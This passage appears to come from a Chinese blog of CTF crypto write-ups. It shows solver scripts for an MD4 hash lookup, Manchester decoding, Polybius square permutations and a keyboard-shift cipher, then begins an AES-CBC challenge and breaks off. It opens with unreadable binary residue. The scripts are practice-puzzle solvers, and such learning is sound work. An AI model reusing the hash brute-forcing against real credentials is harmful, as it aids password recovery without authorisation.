<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kGKû  ­¦¤B k</span><br><span class="line">áÞÿ9èYâZhd+Ð¦</span><br><span class="line">ÍªÈot[õìS»i¼Hk</span><br><span class="line">qäbPO</span><br><span class="line">TW æÈ&quot;Ö</span><br><span class="line">hvYÜ£ÿ `W8</span><br><span class="line">ODju¿C</span><br><span class="line">2  [·KU¹óè</span><br><span class="line">Ú¨ë¤Oáí$måK</span><br><span class="line">Y  GÙ oA SLY 4^</span><br><span class="line">HHÆ&lt;mMýÏ IQBF</span><br><span class="line">Þ×ïHKU³ ¤ÔvsF</span><br><span class="line"> JWcinGÁVlnç÷</span><br></pre></td></tr></table></figure>

<p>然后看了wp是hash函数类型的，然后找逆hash的网站，有些网站要登录收费了；解成功的几个发现是md4，且结果有数字和字母，于是自己写个爆破一下</p>
<p>记得hashlib库里好像没有md4，就从github上随便找了一段源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_pad</span>(<span class="params">msg</span>):</span></span><br><span class="line">    n = <span class="built_in">len</span>(msg)</span><br><span class="line">    bit_len = n * <span class="number">8</span></span><br><span class="line">    index = n &amp; <span class="number">0x3f</span></span><br><span class="line">    pad_len = <span class="number">120</span> - index</span><br><span class="line">    <span class="keyword">if</span> index &lt; <span class="number">56</span>:</span><br><span class="line">        pad_len = <span class="number">56</span> - index</span><br><span class="line">    padding = <span class="string">b&#x27;\x80&#x27;</span> + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">63</span></span><br><span class="line">    suffix = bit_len.to_bytes(<span class="number">8</span>, <span class="string">&#x27;little&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">    padded_msg = msg + padding[:pad_len] + suffix</span><br><span class="line">    <span class="keyword">return</span> padded_msg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_left_rotate</span>(<span class="params">n, b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> ((n &lt;&lt; b) | ((n &amp; <span class="number">0xffffffff</span>) &gt;&gt; (<span class="number">32</span> - b))) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_if</span>(<span class="params">x, y, z</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x &amp; y | ~x &amp; z</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_maj</span>(<span class="params">x, y, z</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x &amp; y | x &amp; z | y &amp; z</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_xor3</span>(<span class="params">x, y, z</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x ^ y ^ z</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_f1</span>(<span class="params">a, b, c, d, k, s, X</span>):</span></span><br><span class="line">    <span class="keyword">return</span> _left_rotate(a + _<span class="keyword">if</span>(b, c, d) + X[k], s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_f2</span>(<span class="params">a, b, c, d, k, s, X</span>):</span></span><br><span class="line">    <span class="keyword">return</span> _left_rotate(a + _maj(b, c, d) + X[k] + <span class="number">0x5a827999</span>, s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_f3</span>(<span class="params">a, b, c, d, k, s, X</span>):</span></span><br><span class="line">    <span class="keyword">return</span> _left_rotate(a + _xor3(b, c, d) + X[k] + <span class="number">0x6ed9eba1</span>, s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MD4</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.A = <span class="number">0x67452301</span></span><br><span class="line">        self.B = <span class="number">0xefcdab89</span></span><br><span class="line">        self.C = <span class="number">0x98badcfe</span></span><br><span class="line">        self.D = <span class="number">0x10325476</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">self, message_string</span>):</span></span><br><span class="line">        msg_bytes = _pad(message_string)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(msg_bytes), <span class="number">64</span>):</span><br><span class="line">            self._compress(msg_bytes[i:i + <span class="number">64</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_compress</span>(<span class="params">self, block</span>):</span></span><br><span class="line">        a, b, c, d = self.A, self.B, self.C, self.D</span><br><span class="line"></span><br><span class="line">        x = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">64</span>, <span class="number">4</span>):</span><br><span class="line">            x.append(<span class="built_in">int</span>.from_bytes(block[i:i + <span class="number">4</span>], <span class="string">&#x27;little&#x27;</span>, signed=<span class="literal">False</span>))</span><br><span class="line"></span><br><span class="line">        a = _f1(a, b, c, d, <span class="number">0</span>, <span class="number">3</span>, x)</span><br><span class="line">        d = _f1(d, a, b, c, <span class="number">1</span>, <span class="number">7</span>, x)</span><br><span class="line">        c = _f1(c, d, a, b, <span class="number">2</span>, <span class="number">11</span>, x)</span><br><span class="line">        b = _f1(b, c, d, a, <span class="number">3</span>, <span class="number">19</span>, x)</span><br><span class="line">        a = _f1(a, b, c, d, <span class="number">4</span>, <span class="number">3</span>, x)</span><br><span class="line">        d = _f1(d, a, b, c, <span class="number">5</span>, <span class="number">7</span>, x)</span><br><span class="line">        c = _f1(c, d, a, b, <span class="number">6</span>, <span class="number">11</span>, x)</span><br><span class="line">        b = _f1(b, c, d, a, <span class="number">7</span>, <span class="number">19</span>, x)</span><br><span class="line">        a = _f1(a, b, c, d, <span class="number">8</span>, <span class="number">3</span>, x)</span><br><span class="line">        d = _f1(d, a, b, c, <span class="number">9</span>, <span class="number">7</span>, x)</span><br><span class="line">        c = _f1(c, d, a, b, <span class="number">10</span>, <span class="number">11</span>, x)</span><br><span class="line">        b = _f1(b, c, d, a, <span class="number">11</span>, <span class="number">19</span>, x)</span><br><span class="line">        a = _f1(a, b, c, d, <span class="number">12</span>, <span class="number">3</span>, x)</span><br><span class="line">        d = _f1(d, a, b, c, <span class="number">13</span>, <span class="number">7</span>, x)</span><br><span class="line">        c = _f1(c, d, a, b, <span class="number">14</span>, <span class="number">11</span>, x)</span><br><span class="line">        b = _f1(b, c, d, a, <span class="number">15</span>, <span class="number">19</span>, x)</span><br><span class="line"></span><br><span class="line">        a = _f2(a, b, c, d, <span class="number">0</span>, <span class="number">3</span>, x)</span><br><span class="line">        d = _f2(d, a, b, c, <span class="number">4</span>, <span class="number">5</span>, x)</span><br><span class="line">        c = _f2(c, d, a, b, <span class="number">8</span>, <span class="number">9</span>, x)</span><br><span class="line">        b = _f2(b, c, d, a, <span class="number">12</span>, <span class="number">13</span>, x)</span><br><span class="line">        a = _f2(a, b, c, d, <span class="number">1</span>, <span class="number">3</span>, x)</span><br><span class="line">        d = _f2(d, a, b, c, <span class="number">5</span>, <span class="number">5</span>, x)</span><br><span class="line">        c = _f2(c, d, a, b, <span class="number">9</span>, <span class="number">9</span>, x)</span><br><span class="line">        b = _f2(b, c, d, a, <span class="number">13</span>, <span class="number">13</span>, x)</span><br><span class="line">        a = _f2(a, b, c, d, <span class="number">2</span>, <span class="number">3</span>, x)</span><br><span class="line">        d = _f2(d, a, b, c, <span class="number">6</span>, <span class="number">5</span>, x)</span><br><span class="line">        c = _f2(c, d, a, b, <span class="number">10</span>, <span class="number">9</span>, x)</span><br><span class="line">        b = _f2(b, c, d, a, <span class="number">14</span>, <span class="number">13</span>, x)</span><br><span class="line">        a = _f2(a, b, c, d, <span class="number">3</span>, <span class="number">3</span>, x)</span><br><span class="line">        d = _f2(d, a, b, c, <span class="number">7</span>, <span class="number">5</span>, x)</span><br><span class="line">        c = _f2(c, d, a, b, <span class="number">11</span>, <span class="number">9</span>, x)</span><br><span class="line">        b = _f2(b, c, d, a, <span class="number">15</span>, <span class="number">13</span>, x)</span><br><span class="line"></span><br><span class="line">        a = _f3(a, b, c, d, <span class="number">0</span>, <span class="number">3</span>, x)</span><br><span class="line">        d = _f3(d, a, b, c, <span class="number">8</span>, <span class="number">9</span>, x)</span><br><span class="line">        c = _f3(c, d, a, b, <span class="number">4</span>, <span class="number">11</span>, x)</span><br><span class="line">        b = _f3(b, c, d, a, <span class="number">12</span>, <span class="number">15</span>, x)</span><br><span class="line">        a = _f3(a, b, c, d, <span class="number">2</span>, <span class="number">3</span>, x)</span><br><span class="line">        d = _f3(d, a, b, c, <span class="number">10</span>, <span class="number">9</span>, x)</span><br><span class="line">        c = _f3(c, d, a, b, <span class="number">6</span>, <span class="number">11</span>, x)</span><br><span class="line">        b = _f3(b, c, d, a, <span class="number">14</span>, <span class="number">15</span>, x)</span><br><span class="line">        a = _f3(a, b, c, d, <span class="number">1</span>, <span class="number">3</span>, x)</span><br><span class="line">        d = _f3(d, a, b, c, <span class="number">9</span>, <span class="number">9</span>, x)</span><br><span class="line">        c = _f3(c, d, a, b, <span class="number">5</span>, <span class="number">11</span>, x)</span><br><span class="line">        b = _f3(b, c, d, a, <span class="number">13</span>, <span class="number">15</span>, x)</span><br><span class="line">        a = _f3(a, b, c, d, <span class="number">3</span>, <span class="number">3</span>, x)</span><br><span class="line">        d = _f3(d, a, b, c, <span class="number">11</span>, <span class="number">9</span>, x)</span><br><span class="line">        c = _f3(c, d, a, b, <span class="number">7</span>, <span class="number">11</span>, x)</span><br><span class="line">        b = _f3(b, c, d, a, <span class="number">15</span>, <span class="number">15</span>, x)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># update state</span></span><br><span class="line">        self.A = (self.A + a) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        self.B = (self.B + b) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        self.C = (self.C + c) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        self.D = (self.D + d) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">digest</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> binascii.hexlify(</span><br><span class="line">            self.A.to_bytes(<span class="number">4</span>, <span class="string">&#x27;little&#x27;</span>, signed=<span class="literal">False</span>) + \</span><br><span class="line">            self.B.to_bytes(<span class="number">4</span>, <span class="string">&#x27;little&#x27;</span>, signed=<span class="literal">False</span>) + \</span><br><span class="line">            self.C.to_bytes(<span class="number">4</span>, <span class="string">&#x27;little&#x27;</span>, signed=<span class="literal">False</span>) + \</span><br><span class="line">            self.D.to_bytes(<span class="number">4</span>, <span class="string">&#x27;little&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">        ).decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>EXP</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sage <span class="keyword">import</span> MD4</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">&#x27;&#x27;&#x27;1b08af276dbc7593271f4ee616289324</span></span><br><span class="line"><span class="string">e2ae3a2350743c516cda412499ba3be9</span></span><br><span class="line"><span class="string">bde52cb31de33e46245e05fbdbd6fb24</span></span><br><span class="line"><span class="string">e23e00be39d36f3462e576a67a7f9199</span></span><br><span class="line"><span class="string">18c79285b514c63fc9035e3f920ae477</span></span><br><span class="line"><span class="string">da44dd192defd1be79f63c350d2920cf</span></span><br><span class="line"><span class="string">4251c4c649c7d2f86327efde23992fa7</span></span><br><span class="line"><span class="string">aae7b2d482382aaad75fde64df8ff86f</span></span><br><span class="line"><span class="string">296f7ffc2e4545dc7792050ceb4a8711</span></span><br><span class="line"><span class="string">6107ac1a55f1e0fecb7ddb60fb3bf109</span></span><br><span class="line"><span class="string">aec2333321d73000161682d3c4ebc009</span></span><br><span class="line"><span class="string">5005b3bf00050bf4f7e43ac33a0454b8&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> printable:</span><br><span class="line">    m = MD4()</span><br><span class="line">    m.update(i.encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">    t = m.digest()</span><br><span class="line">    <span class="keyword">if</span> t <span class="keyword">in</span> cipher:</span><br><span class="line">        cipher = cipher.replace(t, i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cipher.split():</span><br><span class="line">    <span class="built_in">print</span>(i, end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;36D_me&#125;</span><br></pre></td></tr></table></figure>

<p>以后md4不愁了，此外md4也是32位的</p>
<h1 id="BJDCTF"><a href="#BJDCTF" class="headerlink" title="BJDCTF"></a>BJDCTF</h1><h2 id="编码与调制"><a href="#编码与调制" class="headerlink" title="编码与调制"></a>编码与调制</h2><blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密文：2559659965656A9A65656996696965A6695669A9695A699569666A5A6A6569666A59695A69AA696569666AA6</span><br></pre></td></tr></table></figure>

<p>hint</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210711162447275.png" alt="image-20210711162447275"></p>
<blockquote>
<p>解题思路</p>
</blockquote>
<p>计网的知识，曼切斯特和差分曼切斯特</p>
<ol>
<li>标准曼切斯特：低到高 0，高到底 1</li>
<li>IEEE曼切斯特：刚好相反，低到高 1，高到底 0</li>
<li>差分曼切斯特：前后相同为 0，不同为 1</li>
<li>其他类型：只有5，6，9，a这此种字符的</li>
<li>注意：存在字节逆序的问题：每8个字节一逆序</li>
</ol>
<p>老早就在la佬的博客看到，曼切斯特编码的脚本，这次终于用上了，收收好</p>
<p>显然密文中只出现了569a这几个字符，在其他解法这里</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210711174323480.png" alt="image-20210711174323480"></p>
<p>这里是省略第一位的，不排除有其他变式，备份一下脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">long_to_bytes</span>(<span class="params">n</span>):</span></span><br><span class="line">    s = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    pack = struct.pack</span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        s = pack(<span class="string">&#x27;&gt;I&#x27;</span>, n &amp; <span class="number">0xffffffff</span>) + s</span><br><span class="line">        n = n &gt;&gt; <span class="number">32</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        <span class="keyword">if</span> s[i] != <span class="string">b&#x27;\000&#x27;</span>[<span class="number">0</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = <span class="string">b&#x27;\000&#x27;</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">    s = s[i:]</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 字节逆序</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">byteinvert</span>(<span class="params">str_bin</span>):</span></span><br><span class="line">    ret = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str_bin) // <span class="number">8</span>):</span><br><span class="line">        ret += str_bin[i * <span class="number">8</span>:i * <span class="number">8</span> + <span class="number">8</span>][::-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 标准曼彻斯特</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MCST_stand</span>(<span class="params">str_bin</span>):</span></span><br><span class="line">    ret = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str_bin) // <span class="number">2</span>):</span><br><span class="line">        x = str_bin[i * <span class="number">2</span>:i * <span class="number">2</span> + <span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> x == <span class="string">&#x27;01&#x27;</span>:</span><br><span class="line">            ret += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> x == <span class="string">&#x27;10&#x27;</span>:</span><br><span class="line">            ret += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;stand manchester decode wrong!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># IEEE规范的曼彻斯特</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MCST_IEEE</span>(<span class="params">str_bin</span>):</span></span><br><span class="line">    ret = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(math.ceil(<span class="built_in">len</span>(str_bin) / <span class="number">8</span>)):</span><br><span class="line">        x = str_bin[i * <span class="number">2</span>:i * <span class="number">2</span> + <span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> x == <span class="string">&#x27;01&#x27;</span>:</span><br><span class="line">            ret += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> x == <span class="string">&#x27;10&#x27;</span>:</span><br><span class="line">            ret += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;stand manchester decode wrong!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 差分曼彻斯特</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MCST_diff</span>(<span class="params">str_bin</span>):</span></span><br><span class="line">    ret = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(str_bin) // <span class="number">2</span> - <span class="number">1</span>):</span><br><span class="line">        x1 = str_bin[i * <span class="number">2</span>:i * <span class="number">2</span> + <span class="number">2</span>]</span><br><span class="line">        x2 = str_bin[i * <span class="number">2</span> + <span class="number">2</span>:i * <span class="number">2</span> + <span class="number">4</span>]</span><br><span class="line">        <span class="keyword">if</span> x1 == x2:</span><br><span class="line">            ret += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ret += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    str_hex = <span class="string">&#x27;2559659965656A9A65656996696965A6695669A9695A699569666A5A6A6569666A59695A69AA696569666AA6&#x27;</span></span><br><span class="line">    <span class="comment"># str_bin=&#x27;0101010101010101&#x27;</span></span><br><span class="line">    str_bin = <span class="built_in">str</span>(<span class="built_in">bin</span>(<span class="built_in">int</span>(str_hex, <span class="number">16</span>)))[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">    m1 = MCST_IEEE(str_bin)</span><br><span class="line">    m2 = MCST_stand(str_bin)</span><br><span class="line">    m3 = MCST_diff(str_bin)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\nIEEE曼彻斯特:&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(m1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(m1, <span class="number">2</span>)))</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m1, <span class="number">2</span>)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n 标准曼彻斯特:&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(m2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(m2, <span class="number">2</span>)))</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m2, <span class="number">2</span>)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n 差分曼彻斯特:&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(m3)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(m3, <span class="number">2</span>)))</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m3, <span class="number">2</span>)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n=============字节逆序=============&#x27;</span>)</span><br><span class="line">    m1 = byteinvert(m1)</span><br><span class="line">    m2 = byteinvert(m2)</span><br><span class="line">    m3 = byteinvert(m3)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\nIEEE曼彻斯特:&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(m1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(m1, <span class="number">2</span>)))</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m1, <span class="number">2</span>)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n 标准曼彻斯特:&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(m2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(m2, <span class="number">2</span>)))</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m2, <span class="number">2</span>)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n 差分曼彻斯特:&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(m3)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(m3, <span class="number">2</span>)))</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m3, <span class="number">2</span>)))</span><br></pre></td></tr></table></figure>

<h2 id="Polybius"><a href="#Polybius" class="headerlink" title="Polybius"></a>Polybius</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密文：ouauuuoooeeaaiaeauieuooeeiea hint：VGhlIGxlbmd0aCBvZiB0aGlzIHBsYWludGV4dDogMTQ=</span><br></pre></td></tr></table></figure>

<p>hint解出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The length of this plaintext: 14</span><br></pre></td></tr></table></figure>

<p>密文全部是由5个元音字母组成，明文的长度是密文的一半，题目提示是是波利比奥斯棋盘密码，没有说密钥</p>
<p>所谓的波利比奥斯棋盘密码，和 playfair 同属于棋盘密码，它用字符表的坐标来代替坐；所以只有1-5，和playfair一样默认用 i 代替 j；这里没有特殊说明，密钥就取这个了</p>
<p>先转成数字，这里第一次犯了迷糊，因为不一定是以 aeiou 的顺序，还需要爆破，这就意味有120种可能；找到了现成的 python 库实现</p>
<p>看一遍就能懂，有一个坑，害我最后直接调试库里的代码才改正，就是这个参数必须给它大写的，不然后面会因为找不到而报错</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210711190015963.png" alt="image-20210711190015963"></p>
<p>EXP</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line"><span class="keyword">from</span> pycipher <span class="keyword">import</span> PolybiusSquare</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_lowercase</span><br><span class="line"></span><br><span class="line">square = ascii_lowercase.replace(<span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">space = <span class="string">&#x27;AEIOU&#x27;</span></span><br><span class="line">cipher = <span class="string">&#x27;ouauuuoooeeaaiaeauieuooeeiea&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> permutations(space, <span class="number">5</span>):</span><br><span class="line">    l = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">list</span>(i))</span><br><span class="line">    p = PolybiusSquare(key=square, size=<span class="number">5</span>, chars=l)</span><br><span class="line">    m = p.decipher(cipher).lower()</span><br><span class="line">    <span class="keyword">if</span> m.startswith(<span class="string">&#x27;flag&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210711190109271.png" alt="image-20210711190109271"></p>
<p>好家伙找到了宝藏了</p>
<h1 id="密码学AK赛"><a href="#密码学AK赛" class="headerlink" title="密码学AK赛"></a>密码学AK赛</h1><h2 id="加法"><a href="#加法" class="headerlink" title="加法"></a>加法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vtu[ypslg;sh&#125;lrunpstf[sddeptf\</span><br></pre></td></tr></table></figure>

<p>冥冥之中很熟悉，但却说不出来是啥加密；本来打算放弃，然后随便抽取一段出来出来搜，发现一篇CSDN的博客，讲的是为了使密码安全，将密码键位向右移动一位，所谓的键位就是在键盘上位置</p>
<p>直接手撕</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cryptoakflag&#123;keyboardpassword&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>不做了，先到这里吧，瞄了一眼姜少的排名，竟然差这么多，害，差距已经那么大了吗</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>曼切斯特</tag>
        <tag>CopperSmith</tag>
      </tags>
  </entry>
  <entry>
    <title>20210731 DAS 极客巅峰 UIUCTF2021 cryptoctfCrypto方向部分WP</title>
    <url>/posts/fadeeed/</url>
    <content><![CDATA[<p>前两周去北方支教，回来了又去了红帽杯，哈哈跑了半个中国，收获还挺大的。但红帽杯零贡献，再次让我知道了学pwn的必要。回归开始集训，可以安分点了</p>
<p>七月的尾巴赛题，没有当场做出来的看师傅博客复现了</p>
<p>长文废话警告</p>
<span id="more"></span>

<h2 id="2021DASCTF实战精英夏令营暨DASCTF-July-X-CBCTF-4th"><a href="#2021DASCTF实战精英夏令营暨DASCTF-July-X-CBCTF-4th" class="headerlink" title="2021DASCTF实战精英夏令营暨DASCTF July X CBCTF 4th"></a>2021DASCTF实战精英夏令营暨DASCTF July X CBCTF 4th</h2><h3 id="Crypto-Yusa的密码学签到——BlockTrick"><a href="#Crypto-Yusa的密码学签到——BlockTrick" class="headerlink" title="Crypto-Yusa的密码学签到——BlockTrick"></a>Crypto-Yusa的密码学签到——BlockTrick</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">a</span>):</span></span><br><span class="line">	size = (<span class="number">16</span>-<span class="built_in">len</span>(a)%<span class="number">16</span>)%<span class="number">16</span></span><br><span class="line">	a += <span class="built_in">chr</span>(size)*size</span><br><span class="line">	<span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line">iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line">enc = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line"><span class="built_in">print</span>(iv.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		trick = raw_input(<span class="string">&quot;&quot;</span>)</span><br><span class="line">		trick = pad(trick.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">		cipher = enc.encrypt(trick)</span><br><span class="line">		<span class="keyword">if</span> trick == cipher <span class="keyword">and</span> trick != <span class="string">&quot;&quot;</span>:</span><br><span class="line">			<span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">				<span class="built_in">print</span>(f.read())</span><br><span class="line">				exit()</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(cipher.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">			<span 